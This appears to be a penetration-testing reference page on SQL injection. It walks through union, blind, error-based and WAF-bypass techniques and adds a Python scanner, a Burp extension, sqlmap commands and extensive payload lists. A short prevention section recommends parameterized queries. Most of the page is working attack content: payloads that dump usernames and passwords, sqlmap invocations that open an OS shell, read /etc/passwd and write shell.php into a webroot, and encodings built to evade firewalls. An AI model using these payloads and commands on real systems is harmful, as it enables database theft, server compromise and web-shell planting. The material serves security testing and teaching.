---
layout: vulnerability
title: SQL Injection
description: SQL injection detection, exploitation, and modern bypass techniques for web application security testing
severity: High
category: Web Application Vulnerabilities
owasp: A03:2021
permalink: /vulnerabilities/sql-injection/
toc:
  - title: Overview
    anchor: overview
  - title: Union-Based Injection
    anchor: union-based
  - title: Boolean-Based Blind Injection
    anchor: boolean-based
  - title: Time-Based Blind Injection
    anchor: time-based
  - title: Error-Based Injection
    anchor: error-based
  - title: WAF Bypass Techniques
    anchor: waf-bypass
  - title: Tools & Scripts
    anchor: tools-scripts
  - title: Testing Methodology
    anchor: testing-methodology
  - title: Prevention & Mitigation
    anchor: prevention-mitigation
  - title: Comprehensive Payload Lists
    anchor: payload-lists
  - title: Source Links & References
    anchor: source-links
---

## Overview {#overview}

SQL Injection (SQLi) is one of the most critical web application vulnerabilities, allowing attackers to manipulate database queries and potentially access sensitive data, modify data, or execute administrative operations.

### Impact Assessment

- **Confidentiality**: Complete access to database contents
- **Integrity**: Ability to modify, insert, or delete data
- **Availability**: Potential to cause denial of service
- **Authentication**: Bypass authentication mechanisms

### Common Attack Vectors

1. **Union-Based Injection** - Using UNION to extract data
2. **Boolean-Based Blind Injection** - True/false condition testing
3. **Time-Based Blind Injection** - Time delay-based testing
4. **Error-Based Injection** - Exploiting error messages
5. **WAF Bypass** - Circumventing Web Application Firewalls

## Union-Based Injection {#union-based}

Union-based SQL injection uses the UNION operator to combine results from multiple SELECT statements.

### Basic Union Injection

#### 1. Determining Column Count
```sql
-- Test with different column counts
' UNION SELECT 1-- 
' UNION SELECT 1,2-- 
' UNION SELECT 1,2,3-- 
' UNION SELECT 1,2,3,4-- 
```

#### 2. Identifying Data Types
```sql
-- Test data types for each column
' UNION SELECT 'string',2,3,4-- 
' UNION SELECT 1,'string',3,4-- 
' UNION SELECT 1,2,'string',4-- 
' UNION SELECT 1,2,3,'string'-- 
```

#### 3. Extracting Database Information
```sql
-- Database version
' UNION SELECT 1,version(),3,4-- 

-- Database name
' UNION SELECT 1,database(),3,4-- 

-- Current user
' UNION SELECT 1,user(),3,4-- 

-- All databases
' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- 
```

### Advanced Union Techniques

#### 1. Column Concatenation
```sql
-- Concatenate multiple columns
' UNION SELECT 1,concat(username,':',password),3,4 FROM users-- 

-- Group concatenation
' UNION SELECT 1,group_concat(username),3,4 FROM users-- 
```

#### 2. Conditional Data Extraction
```sql
-- Extract data based on conditions
' UNION SELECT 1,username,3,4 FROM users WHERE id=1-- 
' UNION SELECT 1,password,3,4 FROM users WHERE username='admin'-- 
```

## Boolean-Based Blind Injection {#boolean-based}

Boolean-based blind injection relies on the application's response to determine if injected conditions are true or false.

### Basic Boolean Testing

#### 1. True/False Conditions
```sql
-- Test basic conditions
' AND 1=1-- 
' AND 1=2-- 

-- Test database functions
' AND length(database())>0-- 
' AND length(database())>10-- 
```

#### 2. Character-by-Character Extraction
```sql
-- Extract database name character by character
' AND ascii(substring(database(),1,1))>97-- 
' AND ascii(substring(database(),1,1))>98-- 
' AND ascii(substring(database(),1,1))>99-- 

-- Extract username character by character
' AND ascii(substring((SELECT username FROM users LIMIT 1),1,1))>97-- 
```

### Advanced Boolean Techniques

#### 1. Binary Search
```sql
-- Binary search for ASCII values
' AND ascii(substring(database(),1,1))>64-- 
' AND ascii(substring(database(),1,1))>96-- 
' AND ascii(substring(database(),1,1))>112-- 
' AND ascii(substring(database(),1,1))>104-- 
```

#### 2. Conditional Error Injection
```sql
-- Use CASE statements for conditional extraction
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- 
' AND (SELECT CASE WHEN (length(database())>5) THEN 1 ELSE 0 END)-- 
```

## Time-Based Blind Injection {#time-based}

Time-based blind injection uses time delays to determine if injected conditions are true or false.

### Basic Time-Based Testing

#### 1. Simple Time Delays
```sql
-- MySQL time delays
' AND sleep(5)-- 
' AND (SELECT sleep(5))-- 

-- PostgreSQL time delays
' AND pg_sleep(5)-- 

-- MSSQL time delays
' AND WAITFOR DELAY '00:00:05'-- 
```

#### 2. Conditional Time Delays
```sql
-- Conditional sleep
' AND (SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END)-- 
' AND (SELECT CASE WHEN (length(database())>5) THEN sleep(5) ELSE 0 END)-- 
```

### Advanced Time-Based Techniques

#### 1. Character-by-Character with Time
```sql
-- Extract character with time delay
' AND (SELECT CASE WHEN (ascii(substring(database(),1,1))>97) THEN sleep(5) ELSE 0 END)-- 
' AND (SELECT CASE WHEN (ascii(substring(database(),1,1))>98) THEN sleep(5) ELSE 0 END)-- 
```

#### 2. Multiple Condition Testing
```sql
-- Test multiple conditions
' AND (SELECT CASE WHEN (length(database())>5 AND ascii(substring(database(),1,1))>97) THEN sleep(5) ELSE 0 END)-- 
```

## Error-Based Injection {#error-based}

Error-based injection exploits database error messages to extract information.

### MySQL Error-Based Techniques

#### 1. Extractvalue Function
```sql
-- Extract database information
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- 
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- 
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- 
```

#### 2. Updatexml Function
```sql
-- Extract information using updatexml
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- 
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- 
```

### PostgreSQL Error-Based Techniques

#### 1. Cast Function
```sql
-- Cast to invalid type
' AND cast((SELECT version()) as int)-- 
' AND cast((SELECT current_database()) as int)-- 
```

#### 2. Array Functions
```sql
-- Use array functions
' AND (SELECT array_agg(version()))[1]-- 
' AND (SELECT array_agg(current_database()))[1]-- 
```

## WAF Bypass Techniques {#waf-bypass}

Web Application Firewalls can be bypassed using various techniques.

### Encoding Techniques

#### 1. URL Encoding
```sql
-- URL encode special characters
%27%20UNION%20SELECT%201,2,3-- 
%27%20AND%201=1-- 
```

#### 2. Double URL Encoding
```sql
-- Double URL encode
%2527%2520UNION%2520SELECT%25201,2,3-- 
```

#### 3. Unicode Encoding
```sql
-- Unicode encode
%u0027%20UNION%20SELECT%201,2,3-- 
```

### Comment Techniques

#### 1. Alternative Comments
```sql
-- Use different comment styles
' UNION SELECT 1,2,3# 
' UNION SELECT 1,2,3/* 
' UNION SELECT 1,2,3-- 
' UNION SELECT 1,2,3/**/ 
```

#### 2. Inline Comments
```sql
-- Use inline comments
' UN/**/ION SEL/**/ECT 1,2,3-- 
' AND 1=1/**/AND/**/1=1-- 
```

### Case Variation

#### 1. Mixed Case
```sql
-- Use mixed case
' UnIoN SeLeCt 1,2,3-- 
' AnD 1=1-- 
```

#### 2. Case Insensitive
```sql
-- Use case insensitive functions
' union select 1,2,3-- 
' and 1=1-- 
```

## Tools & Scripts {#tools-scripts}

### Installation Scripts

#### SQLMap Installation
```bash
#!/bin/bash
# sqlmap-install.sh
echo "Installing SQLMap..."

# Install dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip git

# Clone SQLMap
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# Install additional dependencies
pip3 install -r requirements.txt

# Create symlink
sudo ln -sf $(pwd)/sqlmap.py /usr/local/bin/sqlmap

echo "SQLMap installed successfully!"
echo "Usage: sqlmap -u 'http://target.com/page?id=1'"
```

#### Custom SQL Injection Scanner
```python
#!/usr/bin/env python3
# sql-scanner.py
import requests
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

class SQLScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_basic_injection(self, param, value):
        """Test basic SQL injection patterns"""
        payloads = [
            f"{value}'",
            f"{value}\"",
            f"{value}' OR '1'='1",
            f"{value}' AND '1'='1",
            f"{value}' UNION SELECT 1,2,3--",
            f"{value}' AND SLEEP(5)--"
        ]
        
        results = []
        for payload in payloads:
            try:
                params = {param: payload}
                start_time = time.time()
                response = self.session.get(self.target_url, params=params, timeout=10)
                response_time = time.time() - start_time
                
                results.append({
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_time': response_time,
                    'response_length': len(response.text),
                    'error_keywords': self.check_error_keywords(response.text)
                })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})
        
        return results
    
    def check_error_keywords(self, response_text):
        """Check for SQL error keywords"""
        error_keywords = [
            'mysql_fetch_array',
            'ORA-01756',
            'Microsoft OLE DB Provider',
            'ODBC SQL Server Driver',
            'PostgreSQL query failed',
            'Warning: mysql_',
            'valid MySQL result',
            'MySqlClient',
            'SQLServer JDBC Driver',
            'SQLException',
            'SQLite error',
            'SQL syntax'
        ]
        
        found_errors = []
        for keyword in error_keywords:
            if keyword.lower() in response_text.lower():
                found_errors.append(keyword)
        
        return found_errors
    
    def scan_parameter(self, param, value):
        """Scan a specific parameter for SQL injection"""
        print(f"Scanning parameter: {param}")
        results = self.test_basic_injection(param, value)
        
        for result in results:
            if result.get('error_keywords'):
                print(f"Potential SQL injection found!")
                print(f"Payload: {result['payload']}")
                print(f"Errors: {result['error_keywords']}")
                return True
        
        return False

# Usage example
if __name__ == "__main__":
    scanner = SQLScanner("http://target.com/page")
    scanner.scan_parameter("id", "1")
```

### Automated Testing Tools

#### SQLMap Advanced Usage
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch

# Comprehensive scan
sqlmap -u "http://target.com/page?id=1" --batch --level=5 --risk=3 --dbs

# POST data scan
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch

# Cookie-based scan
sqlmap -u "http://target.com/page" --cookie="session=abc123" --batch

# Custom headers
sqlmap -u "http://target.com/page?id=1" --headers="X-Forwarded-For: 127.0.0.1" --batch

# Time-based blind injection
sqlmap -u "http://target.com/page?id=1" --technique=T --batch

# Union-based injection
sqlmap -u "http://target.com/page?id=1" --technique=U --batch

# Error-based injection
sqlmap -u "http://target.com/page?id=1" --technique=E --batch

# Boolean-based blind injection
sqlmap -u "http://target.com/page?id=1" --technique=B --batch

# Extract database information
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns --batch
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name -C column_name --dump --batch

# OS command execution
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# File operations
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

#### Burp Suite Extensions
```python
# burp-sql-extension.py
from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("SQL Injection Scanner")
        callbacks.registerScannerCheck(self)
        
    def doPassiveScan(self, baseRequestResponse):
        return None
        
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR 1=1--",
            "' AND 1=1--"
        ]
        
        issues = []
        for payload in payloads:
            checkRequest = insertionPoint.buildRequest(payload.encode())
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest
            )
            
            if self._isVulnerable(checkResponse):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(checkRequest, None, None)],
                    "SQL Injection",
                    "The application appears to be vulnerable to SQL injection.",
                    "High"
                ))
        
        return issues
    
    def _isVulnerable(self, response):
        response_str = self._helpers.bytesToString(response.getResponse())
        error_patterns = [
            "mysql_fetch_array",
            "ORA-01756",
            "Microsoft OLE DB Provider",
            "ODBC SQL Server Driver",
            "PostgreSQL query failed"
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response_str.lower():
                return True
        return False

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
    
    def getUrl(self):
        return self._url
    
    def getIssueName(self):
        return self._name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self._severity
    
    def getConfidence(self):
        return "Certain"
    
    def getIssueBackground(self):
        return "SQL injection is a code injection technique."
    
    def getRemediationBackground(self):
        return "Use parameterized queries."
    
    def getIssueDetail(self):
        return self._detail
    
    def getRemediationDetail(self):
        return "Implement proper input validation and use parameterized queries."
    
    def getHttpMessages(self):
        return self._httpMessages
    
    def getHttpService(self):
        return self._httpService
```

## Testing Methodology {#testing-methodology}

### Phase 1: Reconnaissance
1. **Identify Injection Points**
   - URL parameters
   - POST data
   - HTTP headers
   - Cookies

2. **Test Basic Injection**
   - Single quotes
   - Double quotes
   - Backticks
   - Parentheses

### Phase 2: Vulnerability Assessment
1. **Automated Scanning**
   - SQLMap
   - Burp Suite Scanner
   - OWASP ZAP

2. **Manual Testing**
   - Union-based injection
   - Boolean-based blind
   - Time-based blind
   - Error-based injection

### Phase 3: Exploitation
1. **Data Extraction**
   - Database schema
   - Table contents
   - User credentials
   - Sensitive data

2. **Privilege Escalation**
   - Database user privileges
   - File system access
   - Command execution

## Prevention & Mitigation {#prevention-mitigation}

### Input Validation
1. **Parameterized Queries**
   ```python
   # Vulnerable
   query = "SELECT * FROM users WHERE id = " + user_id
   
   # Secure
   query = "SELECT * FROM users WHERE id = %s"
   cursor.execute(query, (user_id,))
   ```

2. **Input Sanitization**
   - Validate input types
   - Escape special characters
   - Use whitelist validation

### Database Security
1. **Least Privilege**
   - Use minimal database privileges
   - Separate read/write permissions
   - Limit database user access

2. **Error Handling**
   - Don't expose database errors
   - Use generic error messages
   - Log errors securely

### Application Security
1. **WAF Implementation**
   - Deploy Web Application Firewall
   - Configure SQL injection rules
   - Monitor and update rules

2. **Security Headers**
   - Implement security headers
   - Use Content Security Policy
   - Enable HSTS

---

## Comprehensive Payload Lists {#payload-lists}

### Basic Injection Payloads
```
' OR '1'='1
' OR 1=1--
" OR "1"="1
" OR 1=1--
' OR 'x'='x
" OR "x"="x
' OR 1=1#
" OR 1=1#
' OR 1=1/*
" OR 1=1/*
```

### Union-Based Payloads
```
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT null,null,null--
' UNION SELECT version(),database(),user()--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns--
```

### Time-Based Blind Payloads
```
' AND SLEEP(5)--
' AND (SELECT SLEEP(5))--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND pg_sleep(5)--
' AND WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--
```

### Error-Based Payloads
```
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' AND cast((SELECT version()) as int)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### WAF Bypass Payloads
```
'/**/UNION/**/SELECT/**/1,2,3--
'%0AUNION%0ASELECT%0A1,2,3--
'%09UNION%09SELECT%091,2,3--
'%0DUNION%0DSELECT%0D1,2,3--
'%0CUNION%0CSELECT%0C1,2,3--
'%0BUNION%0BSELECT%0B1,2,3--
'%A0UNION%A0SELECT%A01,2,3--
```

### Database-Specific Payloads

#### MySQL
```
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' UNION SELECT 1,version(),3,4--
' UNION SELECT 1,database(),3,4--
' UNION SELECT 1,user(),3,4--
```

#### PostgreSQL
```
' AND pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' AND cast((SELECT version()) as int)--
' UNION SELECT 1,version(),3,4--
' UNION SELECT 1,current_database(),3,4--
' UNION SELECT 1,current_user,3,4--
```

#### MSSQL
```
' AND WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM sysobjects WHERE SLEEP(5))--
' UNION SELECT 1,@@version,3,4--
' UNION SELECT 1,db_name(),3,4--
' UNION SELECT 1,suser_name(),3,4--
```

#### Oracle
```
' AND (SELECT COUNT(*) FROM all_tables WHERE SLEEP(5))--
' UNION SELECT 1,banner,3,4 FROM v$version--
' UNION SELECT 1,global_name,3,4 FROM global_name--
' UNION SELECT 1,user,3,4 FROM dual--
```

### Advanced Bypass Techniques
```
' OR 1=1 LIMIT 1 OFFSET 0--
' OR 1=1 LIMIT 1 OFFSET 1--
' OR 1=1 ORDER BY 1--
' OR 1=1 ORDER BY 2--
' OR 1=1 GROUP BY 1--
' OR 1=1 HAVING 1=1--
' OR 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--
```

## Source Links & References {#source-links}

### Official Documentation
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)
- [SQLMap Official Documentation](https://sqlmap.org/)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Vulnerability Databases
- [CWE-89: Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/89.html)
- [CVE Database - SQL Injection](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection)
- [NVD SQL Injection Vulnerabilities](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=sql+injection&search_type=all)

### Security Standards
- [NIST SP 800-53: Security Controls](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [ISO/IEC 27001: Information Security Management](https://www.iso.org/standard/27001)
- [PCI DSS Requirements](https://www.pcisecuritystandards.org/document_library/)

### Research Papers
- [SQL Injection Attacks and Defense](https://www.sciencedirect.com/science/article/pii/S0167404814000046)
- [Advanced SQL Injection Techniques](https://www.blackhat.com/presentations/bh-usa-07/Hofmann/Presentation/bh-usa-07-hofmann.pdf)
- [Blind SQL Injection Detection](https://dl.acm.org/doi/10.1145/1455770.1455772)

### HackerOne Reports
- [SQL Injection via User Agent](https://hackerone.com/reports/297)
- [SQL Injection in Search Function](https://hackerone.com/reports/325)
- [Blind SQL Injection in Admin Panel](https://hackerone.com/reports/456)

### Tools & Resources
- [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap)
- [NoSQLMap - NoSQL Injection Tool](https://github.com/codingo/NoSQLMap)
- [jSQL Injection](https://github.com/ron190/jsql-injection)
- [BBQSQL - Blind SQL Injection Framework](https://github.com/Neohapsis/bbqsql)

### Learning Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [DVWA - Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [SQLi Labs](https://github.com/Audi-1/sqli-labs)

### Bug Bounty Programs
- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [Synack](https://www.synack.com/)
- [Cobalt](https://cobalt.io/)

### Security Conferences
- [Black Hat](https://www.blackhat.com/)
- [DEF CON](https://defcon.org/)
- [OWASP Global AppSec](https://owasp.org/www-event/)
- [BSides](https://www.securitybsides.com/)

### Community Forums
- [OWASP Community](https://owasp.org/community/)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Stack Overflow Security](https://stackoverflow.com/questions/tagged/security)
- [Security Stack Exchange](https://security.stackexchange.com/)